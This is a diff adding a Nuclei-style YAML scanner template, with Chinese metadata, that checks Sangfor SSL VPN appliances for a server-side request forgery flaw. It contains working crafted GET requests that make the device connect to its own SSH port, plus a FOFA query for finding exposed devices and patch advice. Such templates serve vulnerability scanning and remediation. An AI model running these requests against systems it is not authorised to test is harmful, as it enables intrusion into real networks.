@@ -1,0 +1,31 @@
+id: sangfor-sslvpn-ssrf
+info:
+  name: 深信服 SSLVPN SSRF
+  author: leadlife
+  severity: high
+  description: 深信服SSLVPN URI 路径存在SSRF漏洞，该漏洞允许攻击者通过服务器端应用程序向恶意服务器或服务发出请求。通常用于绕过安全措施，访问受限资源，或者执行其他恶意行为
+  metadata:
+    verified: true
+    fofa-query: app="SANGFOR-SSL-VPN"
+    repair: 联系 sangfor 400 客服，打上 AW_01 补丁包修复，包名：SP_SSL_AW_01
+  tags: sangfor,2022,ssrf,sslvpn,iot
+
+http:
+  - raw:
+      - |
+        GET /WEB/0/http/1/127.0.0.1:22/web/1/http/0/127.0.0.1:22 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: TWFID=1
+
+      - |
+        GET /WEB/0/https/1/127.0.0.1:22/web/1/https/0/127.0.0.1:22 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: TWFID=1
+      
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'OpenSSH')
+        condition: and
